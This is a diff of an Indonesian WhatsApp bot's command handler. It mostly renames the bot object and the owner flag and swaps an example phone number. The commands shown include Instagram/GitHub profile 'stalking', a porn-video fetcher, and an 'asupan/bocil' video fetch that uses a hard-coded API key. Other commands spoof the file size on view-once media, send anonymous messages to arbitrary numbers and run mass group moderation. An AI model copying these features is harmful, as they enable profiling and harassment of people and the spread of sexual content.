+{title: `⊟ 𝗣𝗛𝗢𝗧𝗢 𝗢𝗫𝗬 𝗠𝗘𝗡𝗨`, rowId: `${prefix}photooxymenu`},
+{title: `⊟ 𝗘𝗣𝗛𝗢𝗧𝗢 𝟯𝟲𝟬 𝗠𝗘𝗡𝗨`, rowId: `${prefix}ephoto360menu`},
+{title: `⊟ 𝗖𝗘𝗥𝗣𝗘𝗡 𝗠𝗘𝗡𝗨`, rowId: `${prefix}cerpenmenu`},
 ]}]
 const listMenuMessage = { 
 text: `Silahkan Kak @${sender.split("@")[0]} Pencet Button List Message Nya Di Bawah Ya`,
 mentions: [sender],
 footer: fake,
-buttonText: 'List Button By BayMax',
+buttonText: 'List Button By baymax',
 sections: seactions,
 listType: 1}
 
 switch (command) {
 case 'shutdown':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 reply(`Bye...`)
 await sleep(3000)
 process.exit()
 break
 case 'owner': {
-const repf = await BayMax.sendMessage(from, { 
+const repf = await baymax.sendMessage(from, { 
 contacts: { 
 displayName: `${list.length} Kontak`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-BayMax.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
+baymax.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, mentions: [sender]}, { quoted: repf })
 }
 break
 case 'menu':{
-const tyds = await BayMax.sendMessage(from, buttonLocnya, { quoted : m })
-BayMax.sendMessage(from, listMenuMessage, { quoted: tyds })
+const tyds = await baymax.sendMessage(from, buttonLocnya, { quoted : m })
+baymax.sendMessage(from, listMenuMessage, { quoted: tyds })
 }
 break
 case 'allmenu':
@@ -1265,16 +1265,16 @@ setTimeout(() => {
 reply('Berhasil Mendapatkan Satu Orang')
 }, 5000)
 setTimeout(() => {
-BayMax.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
+baymax.sendMessage(from, {text: `Nih Kak @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
 }, 9000)
 break
 case 'sc': case 'scriptbot': case 'scbot':{
-BayMax.sendMessage(m.chat,{text:`Mau Script  Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
+baymax.sendMessage(m.chat,{text:`Mau Script Bot Nya? Silahkan Chat Aja @${creator.split("@")[0]}`,mentions: [creator], },{quoted:m})
 }
 break
 case 'q': case 'quoted': {
 if (!m.quoted) return reply('Reply Pesannya!!')
-let wokwol = await BayMax.serializeM(await m.getQuotedObj())
+let wokwol = await baymax.serializeM(await m.getQuotedObj())
 if (!wokwol.quoted) return reply('Pesan Yang anda reply tidak mengandung reply')
 await wokwol.quoted.copyNForward(m.chat, true)
 }
@@ -1291,7 +1291,7 @@ exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
 fs.unlinkSync(ranm)
 buff = fs.readFileSync(rano)
 if (err) return reply(mess.error)
-BayMax.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
+baymax.sendMessage(m.chat,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:m})
 fs.unlinkSync(rano)
 })
 })
@@ -1300,7 +1300,7 @@ case 'igstalk':{
 if (!isPrem) return replyprem(mess.premium)
 if (!q) return reply(`Contoh ${prefix+command} kirbotzx`)
 aj = await igstalk(`${q}`)
-BayMax.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
+baymax.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
 `*/ Stalking Instagram \\*
 
 Fullname : ${aj.fullname}
@@ -1350,7 +1350,7 @@ break
 case 'ghstalk':{
 if (!q) return reply(`Contoh ${prefix+command} KirBotz`)
 aj = await githubstalk.githubstalk(`${q}`)
-BayMax.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
+baymax.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
 `*/ Stalking Github \\*
 
 Username : ${aj.username}
@@ -1377,30 +1377,30 @@ break
 case 'ss': case 'ssweb':{
 if (!q) return reply(`Contoh ${prefix+command} link`)
 let krt = await scp1.ssweb(q)
-BayMax.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
+baymax.sendMessage(m.chat,{image:krt.result,caption:mess.succes},{quoted:m})
 }
 break
 case 'join': {
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!text) return reply(`Contoh ${prefix+command} linkgc`)
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
 let result = args[0].split('https://chat.whatsapp.com/')[1]
-await BayMax.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await baymax.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'toonce': { 
 if (!quoted) return reply(`Reply Image/Video`)
 if (/image/.test(mime)) {
-anuan = await BayMax.downloadAndSaveMediaMessage(quoted)
-BayMax.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
+anuan = await baymax.downloadAndSaveMediaMessage(quoted)
+baymax.sendMessage(m.chat, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
 } else if (/video/.test(mime)) {
-anuanuan = await BayMax.downloadAndSaveMediaMessage(quoted)
-BayMax.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
+anuanuan = await baymax.downloadAndSaveMediaMessage(quoted)
+baymax.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: m })
 }
 }
 break
 case 'autodltt':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (args[0] == 'on') {
 if (autodltt) return reply('*Sudah Aktif!*')
 autodltt = true
@@ -1414,11 +1414,11 @@ let buttons = [
 { buttonId: '.autodltt on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.autodltt off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await BayMax.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
+await baymax.sendButtonText(m.chat, buttons, `Mode Auto Download Tiktok`, `Pilih On Atau Off`, m)
 }
 break
 case 'autosticker':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (args[0] == 'on') {
 if (autosticker) return reply('*Sudah Aktif!*')
 autosticker = true
@@ -1432,35 +1432,35 @@ let buttons = [
 { buttonId: '.autosticker on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.autosticker off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await BayMax.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
+await baymax.sendButtonText(m.chat, buttons, `Mode Autosticker`, `Pilih On Atau Off`, m)
 }
 break
 case 'bc':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!q) return reply(`Teks Nya Bang?`)
 let anu = await store.chats.all().map(v => v.id)
 for (let yoi of anu) {
-BayMax.sendMessage(yoi,{text:`INFORMASI
-Buat User 
+baymax.sendMessage(yoi,{text:`INFORMASI
+Buat User Bot
 
 ${q}`})
 }
 reply(`Succes`)
 break
 case 'ban':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} add/del nomor\nContoh ${prefix+command} add/del 6287705048235`)
 orgnye = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
-let ceknye = await BayMax.onWhatsApp(orgnye)
+let ceknye = await baymax.onWhatsApp(orgnye)
 if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 const isBane = banUser ? banUser.includes(orgnye) : false
 if (args[0] === "add") {
 if (isBane) return reply('User Sudah Dibanned')
-BayMax.updateBlockStatus(orgnye, 'block')
+baymax.updateBlockStatus(orgnye, 'block')
 reply(`Succes Ban`)
 } else if (args[0] === "del") {
 if (!isBane) return reply('User Tidak Dibanned')
-BayMax.updateBlockStatus(orgnye, 'unblock')
+baymax.updateBlockStatus(orgnye, 'unblock')
 reply(`Succes Unban`)
 } else {
 reply("Error")
@@ -1488,12 +1488,12 @@ rows: listBloxk
 const listMessage = {
 text: teskd,
 footer: fake,
-title: "     �� List Participants Blockir ��",
+title: "     「 List Participants Blockir 」",
 buttonText: "List Blockir",
-mentions: await BayMax.parseMention(teskd),
+mentions: await baymax.parseMention(teskd),
 sections
 }
-BayMax.sendMessage(from, listMessage, {quoted:m})
+baymax.sendMessage(from, listMessage, {quoted:m})
 } catch {
 reply("Tidak ada user yang diblockir")
 }
@@ -1502,25 +1502,25 @@ break
 case 'asupan': case 'bocil': case 'rikagusriani':{
 if (!isPrem) return replyprem(mess.premium)
 fdy = await fetchJson(`https://kirbotz-api.herokuapp.com/api/random/asupan/${command}?apikey=KirBotz`)
-BayMax.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
+baymax.sendMessage(m.chat, { video : { url: fdy.result.url }, caption: `${mess.succes}` }, { quoted: m })
 }
 break
 case 'jadibot': {
 if (m.isGroup) return reply(mess.private)
 if (!isPrem) return replyprem(mess.premium)
-jadibot(BayMax, m, from)
+jadibot(baymax, m, from)
 }
 break
 case 'listjadibot': 
 try {
-let user = [... new Set([...global.conns.filter(BayMax => BayMax.user).map(BayMax => BayMax.user)])]
+let user = [... new Set([...global.conns.filter(baymax => baymax.user).map(baymax => baymax.user)])]
 te = "*List Jadibot*\n\n"
 for (let i of user){
-y = await BayMax.decodeJid(i.id)
-te += " �� User : @" + y.split("@")[0] + "\n"
-te += " �� Name : " + i.name + "\n\n"
+y = await baymax.decodeJid(i.id)
+te += " × User : @" + y.split("@")[0] + "\n"
+te += " × Name : " + i.name + "\n\n"
 }
-BayMax.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
+baymax.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
 } catch (err) {
 reply(`Belum Ada User Yang Jadibot`)
 }
@@ -1529,56 +1529,56 @@ case 'hentaivid': {
 if (!isPrem) return replyprem(mess.premium)
 sbe = await hentaivid()
 cejd = sbe[Math.floor(Math.random(), sbe.length)]
-BayMax.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
-caption: `? Title : ${cejd.title}
-? Category : ${cejd.category}
-? Mimetype : ${cejd.type}
-? Views : ${cejd.views_count}
-? Shares : ${cejd.share_count}
-? Source : ${cejd.link}
-? Media Url : ${cejd.video_1}` }, { quoted: m })
+baymax.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
+caption: `⭔ Title : ${cejd.title}
+⭔ Category : ${cejd.category}
+⭔ Mimetype : ${cejd.type}
+⭔ Views : ${cejd.views_count}
+⭔ Shares : ${cejd.share_count}
+⭔ Source : ${cejd.link}
+⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
 }
 break
 case 'menfes': case 'confes':
 if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
 if (m.isGroup) return reply(mess.private)
-if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6281390368580|Hai Owner`)
+if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6287705048235|Hai Owner`)
 if (text > 700) return reply(`Teks Kepanjangan`)
 num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 pesan = q.split('|')[1]
-let cekno = await BayMax.onWhatsApp(num)
+let cekno = await baymax.onWhatsApp(num)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (num === m.sender) return reply(`Tidak Bisa Menfess Ke Nomor Sendiri!!!`)
-if (num === botNumber) return reply(`Tidak Bisa Menfess Ke Nomor !!!`)
+if (num === botNumber) return reply(`Tidak Bisa Menfess Ke Nomor bot!!!`)
 var nomor = m.sender
 let buttons = [
 { buttonId: '.leave', buttonText: { displayText: 'Biarin' }, type: 1 }
 ]
-await BayMax.sendButtonText(num, buttons, `Hi Saya  Ada Yang Kirim Pesan Ke Kamu
+await baymax.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
 Seseorang Temanmu
 (Pengirim Rahasia)
 
 -------------------------------------->
 
-? Pesan : ${pesan}
+💌 Pesan : ${pesan}
 
 -------------------------------------->`, `PENGIRIM RAHASIA
 Anda Ingin Mengirimkan Pesan Ke Pacar/Sahabat/Teman/Doi/Mantan?
 Tapi Tidak Ingin Tau Siapa Pengirimnya?
-Kamu Bisa Menggunakan  Ini
+Kamu Bisa Menggunakan Bot Ini
 Contoh Penggunaan: ${prefix+command} nomor|pesan untuknya
 
 Contoh: ${prefix+command} 628xxxxxxxx|hai owner`, m)
-await BayMax.sendMessage(num, {text:`???? ???? ???? ???????? ????? ??? ?????? ???? ???????? ?????, ???? ???? ????? ??? ???????? ??? ?????? ?????? ?????? ?? ???? ??? ???????`}, { quoted : ftext })
+await baymax.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : ftext })
 lidt = `Sukses Mengirim Pesan
-? Dari : wa.me/${nomor.split("@s.whatsapp.net")[0]}
-? Ke : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}
+👤 Dari : wa.me/${nomor.split("@s.whatsapp.net")[0]}
+👥 Ke : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}
 
-?����?������������������?����?
+⬡──⬡─────────⬡──⬡
 
 Isi Pesan : ${pesan}
 
-?����?������������������?����?`
+⬡──⬡─────────⬡──⬡`
 var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
 if (!check) {
 anon.createRoom(sender, num)
@@ -1587,14 +1587,14 @@ return reply(lidt)
 }
 break
 case 'leave':{
-if (m.isGroup && itsMeBayMax && command == "leave") return BayMax.groupLeave(from)
+if (m.isGroup && itsMeKayla && command == "leave") return baymax.groupLeave(from)
 if (m.isGroup) return reply("Only private chat")
 var room = Object.values(anon.anonymous).find(p => p.check(sender))
 if (!room) return reply("Anda tidak berada didalam room")
 reply("Bye...")
 var other = room.other(sender)
 delete anon.anonymous[room.id]
-if (other != "") BayMax.sendMessage(other, {
+if (other != "") baymax.sendMessage(other, {
 text: "Bye..."
 })
 if (command == "leave") break;
@@ -1610,7 +1610,7 @@ m.reply(`${m.pushName} sekarang afk\nAlasan : ${args.join(" ") ? args.join(" ") 
 break
 case 'antilink':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (antilink) return reply('*Sudah Aktif!*')
@@ -1625,12 +1625,12 @@ let buttons = [
 { buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await BayMax.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
+await baymax.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
 }
 break
 case 'antiwame':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (antiwame) return reply('*Sudah Aktif!*')
@@ -1645,20 +1645,20 @@ let buttons = [
 { buttonId: '.antiwame on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await BayMax.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
+await baymax.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
 }
 break
 case 'add': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await BayMax.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await baymax.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'closetime':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[1] == 'detik') {
 var timer = args[0] * `1000`
@@ -1675,13 +1675,13 @@ reply(`Close time ${q} dimulai dari sekarang`)
 setTimeout(() => {
 var nomor = m.participant
 const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
-BayMax.groupSettingUpdate(from, 'announcement')
+baymax.groupSettingUpdate(from, 'announcement')
 reply(close)
 }, timer)
 break
 case 'opentime':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[1] == 'detik') {
 var timer = args[0] * `1000`
@@ -1698,52 +1698,52 @@ reply(`Open time ${q} dimulai dari sekarang`)
 setTimeout(() => {
 var nomor = m.participant
 const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
-BayMax.groupSettingUpdate(from, 'not_announcement')
+baymax.groupSettingUpdate(from, 'not_announcement')
 reply(open)
 }, timer)
 break
 case 'kick': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await BayMax.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await baymax.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'promote': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await BayMax.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await baymax.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'demote': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await BayMax.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await baymax.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'hidetag': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (!q) return reply(`Teks?`)
-BayMax.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
+baymax.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 }
 break
 case 'tagall': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMeBayMax) return reply(mess.admin)
+if (!isAdmins && !itsMeKayla) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (!q) return reply(`Teks?`)
-let teks = `${q ? q : ''}\n?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????\n�T�T?? *? Tag All* ??�T�T\n`
+let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎